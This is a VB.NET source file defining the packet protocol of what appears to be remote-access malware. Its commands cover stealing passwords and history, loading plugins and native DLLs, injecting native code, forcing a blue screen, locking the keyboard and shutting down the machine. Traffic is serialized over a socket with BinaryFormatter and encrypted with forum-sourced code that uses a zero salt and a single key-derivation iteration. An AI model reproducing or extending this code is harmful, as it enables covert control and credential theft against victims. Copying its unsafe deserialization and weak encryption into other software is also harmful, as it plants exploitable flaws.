Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Cryptography

Public Class Packet
    <Serializable()>
    Public Class PacketMaker
        Public Property Plugin As Byte()
        Public Property Type_Packet As PacketType
        Public Property File_Name As String
        Public Property Function_Params As Object()
        Public Property Misc As Object()
    End Class

    Public Enum PacketType As Integer
        MSG = &H5057
        File = &H5056
        PLUGIN = &H0
        ID = &H1
        PW = &H3
        HIST = &H4
        W_PW = &H5
        TASKS = &H6
        RD = &H7
        PLUGIN_C# = &H8

        ERROR_LOAD_NATIVE_DLL = &H9

        SUCCESS_LOAD_NATIVE_DLL = &H10
    End Enum

    Public Enum Packet_Subject
        RETRIEVE_TASKS = &H199
        KILL_TASK = &H200
        RESUME_TASK = &H201
        PAUSE_TASK = &H202


        LOG_OUT = &H300
        REBOOT = &H301
        SHUTDOWN = &H302
        BSOD = &H304

        WALLPAPER = &H305

        SUSPEND = &H306
        HIBERNATE = &H307

        MUTE_SOUND = &H308
        VOLUME = &H309

        KB_LCK = &H311
        KB_ULCK = &H312

        TSK_BAR = &H313

        DSK_IC = &H315

        '    HIDE_DSI = &H315
        '   SHOW_DSI = &H316

        SWAP_MB = &H317

        EMPTY_BIN = &H318

        ROTATE_SCREEN = &H319

        CURSOR_VISIBILITY = &H320

        BLUR_LK_START = &H321
        BLUR_LK_STOP = &H322

        INJECT_NATIVE = &H323
    End Enum

    Public Class Packet_Send
        Public Property Packet As PacketMaker

        Public Sub Send(ByVal N As NetworkStream)
            Dim B As New BinaryFormatter

            B.Serialize(N, Packet)
        End Sub
    End Class

    Public Class Encryption
        'From : https://bhf.im/threads/438711/
        Public Shared Function RSMEncrypt(ByVal input As Byte(), ByVal key As Byte()) As Byte()
            Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(key, New Byte(7) {}, 1)

            Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(16)
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(16)
            Dim array As Byte() = New Byte(input.Length + 16 - 1) {}
            Buffer.BlockCopy(Guid.NewGuid().ToByteArray(), 0, array, 0, 16)
            Buffer.BlockCopy(input, 0, array, 16, input.Length)
            Return rijndaelManaged.CreateEncryptor().TransformFinalBlock(array, 0, array.Length)
        End Function

        Public Shared Function RSMDecrypt(ByVal data As Byte(), ByVal key As Byte()) As Byte()
            Dim R As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(key, New Byte(7) {}, 1)
            Dim T As RijndaelManaged = New RijndaelManaged()
            T.Key = R.GetBytes(16)
            T.IV = R.GetBytes(16)
            Dim O As Byte() = T.CreateDecryptor().TransformFinalBlock(data, 0, data.Length)
            Dim U As Byte() = New Byte(O.Length - 16 - 1) {}
            Buffer.BlockCopy(O, 16, U, 0, O.Length - 16)
            Return U
        End Function
    End Class
End Class
